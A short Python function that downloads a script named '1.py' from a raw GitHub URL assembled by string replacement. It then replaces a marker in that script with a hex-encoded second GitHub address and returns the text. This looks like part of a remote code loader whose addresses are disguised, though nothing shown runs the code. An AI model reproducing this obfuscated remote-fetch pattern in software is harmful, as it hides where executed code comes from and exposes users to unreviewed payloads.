def m_get():
	import requests
	_url = str('https://raw.githubusercontent.com/17ack312/myscripts/main/####').replace('####',"1.py")
	res=str(requests.get(_url,timeout=2).content.decode()).replace("#$#$",'68747470733a2f2f6769746875622e636f6d2f313761636b3331322f64617461')
	return res
